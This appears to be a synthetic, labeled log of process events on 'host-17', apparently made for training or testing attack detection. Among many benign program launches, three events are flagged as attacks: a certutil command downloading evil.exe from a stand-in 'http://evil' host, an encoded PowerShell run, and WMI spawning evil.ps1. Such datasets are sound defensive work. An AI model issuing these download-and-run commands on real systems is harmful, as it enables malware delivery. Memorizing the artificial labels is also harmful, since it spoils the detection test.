+{"@timestamp": "2025-06-05T10:48:00.826967", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T08:45:46.170403", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:05:28.263389", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:23:23.390547", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:13:29.662348", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:25:30.686121", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:29:13.487420", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:32:07.706083", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:39:42.288486", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T20:00:33.920794", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:39:41.535769", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:27:47.192854", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:09:39.300983", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T21:07:09.370130", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:23:58.650117", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:19:18.315802", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:10:20.837962", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:16:00.459540", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:06:39.405385", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T20:49:07.489753", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:00:48.469440", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:42:11.810173", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:11:25.449251", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:58:47.167771", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:05:55.717290", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:46:56.353773", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:37:14.826725", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:37:17.967214", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:47:28.748625", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:01:09.058747", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:24:18.045640", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:25:07.517526", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:14:29.881840", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:53:13.788526", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:50:29.623817", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:26:43.002238", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:32:02.522629", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:12:45.173461", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T07:45:16.985059", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:12:33.845923", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:24:58.659368", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:38:26.942923", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:47:18.301276", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:53:37.223471", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:41:00.721301", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:32:48.750093", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T16:15:24.027249", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:46:37.895970", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:42:17.782956", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:49:48.351164", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:12:43.177824", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:07:55.088066", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:13:10.603425", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:11:44.067098", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T22:17:10.200533", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:55:58.292172", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:44:18.059618", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:02:13.508373", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:13:48.348874", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:22:29.730502", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:57:50.564369", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:54:37.819284", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:29:08.858194", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:48:53.713753", "host": "host-17", "process": "powershell.exe", "args": "-enc <base64>", "attack": true}
+{"@timestamp": "2025-06-05T12:46:01.976220", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:15:56.850033", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:17:11.952638", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:20:50.605120", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:28:24.453624", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:42:09.513007", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:21:20.901907", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:32:12.352621", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:27:07.482853", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:11:48.412315", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:26:10.093585", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:03:09.980110", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:08:09.037388", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:43:09.017176", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:27:34.795584", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:20:53.687686", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:13:59.112911", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:33:38.125625", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:39:37.225793", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:41:51.314373", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T19:56:36.447834", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:16:03.340799", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:10:02.360290", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:14:57.419421", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:07:42.127298", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:03:57.048320", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:11:07.553609", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:48:28.250311", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:51:44.889891", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T09:28:43.587518", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:14:17.902846", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:09:13.296284", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:06:05.764355", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:44:15.562800", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:14:16.902320", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:47:11.897008", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:21:37.263869", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:13:08.575553", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:01:20.067569", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:50:49.853022", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:13:30.860145", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:03:27.855174", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:24:20.519465", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:57:13.905656", "host": "host-17", "process": "certutil.exe", "args": "-urlcache -split -f http://evil/evil.exe", "attack": true}
+{"@timestamp": "2025-06-05T17:43:55.234630", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:59:17.666981", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:25:43.846834", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:20:35.049854", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:57:17.655884", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T14:21:44.014471", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:21:01.185141", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:25:27.991185", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:39:34.424618", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:31:01.658571", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:17:33.412014", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:05:40.736666", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:12:33.285627", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:22:31.448117", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:03:28.857314", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:08:21.513028", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:01:54.222302", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:10:59.138373", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T07:34:17.634429", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:36:21.679058", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:43:13.224964", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:16:26.696925", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:05:57.722275", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:18:46.222993", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-06T03:34:37.640000", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:39:04.712094", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:11:37.757585", "host": "host-17", "process": "wmiprvse.exe", "args": "spawn evil.ps1", "attack": true}
+{"@timestamp": "2025-06-06T02:04:02.908178", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:12:19.929904", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:01:45.301052", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:57:12.837280", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:18:16.169142", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:37:52.300502", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:12:43.914083", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:32:10.639616", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:07:41.334271", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:58:30.458101", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:53:37.359749", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:30:44.243965", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:38:28.185434", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:27:29.654573", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:30:38.536014", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:12:47.200291", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T17:44:18.308002", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:07:41.213589", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:17:53.255172", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:48:34.656671", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:09:01.471189", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:57:41.306060", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:05:58.324398", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:57:48.699842", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:02:51.932857", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:21:27.002885", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:59:30.930933", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:20:16.388393", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:49:51.460623", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:33:13.088763", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:40:44.861873", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:54:46.268120", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-06T05:54:16.783197", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:48:21.519085", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T22:19:00.966654", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:36:32.179528", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:42:40.635827", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:35:16.100048", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:42:32.087892", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:23:43.217024", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:52:19.678939", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:39:29.074778", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:54:45.147367", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:36:20.677518", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:42:45.230197", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:59:36.889835", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:10:59.039365", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:35:11.061951", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:00:07.818296", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:49:20.585304", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:25:34.360442", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:40:00.403231", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:54:50.753097", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:51:44.041027", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:33:32.951520", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:26:51.175301", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:19:28.298004", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:05:59.327135", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:07:49.712247", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:29:45.187973", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:48:50.075754", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:20:35.117228", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:51:16.159985", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:42:16.002850", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:49:46.142444", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-06T01:16:07.646191", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:40:01.528817", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:26:41.703003", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:45:06.616500", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:11:32.288409", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:50:08.288562", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:44:34.289037", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:59:25.612783", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T08:45:37.267252", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:54:51.038321", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:30:15.058052", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:58:37.245741", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:24:57.093311", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:01:29.158603", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:13:52.177425", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:47:00.837835", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:02:30.338338", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:22:40.304166", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:02:16.020793", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-06T00:48:18.443395", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
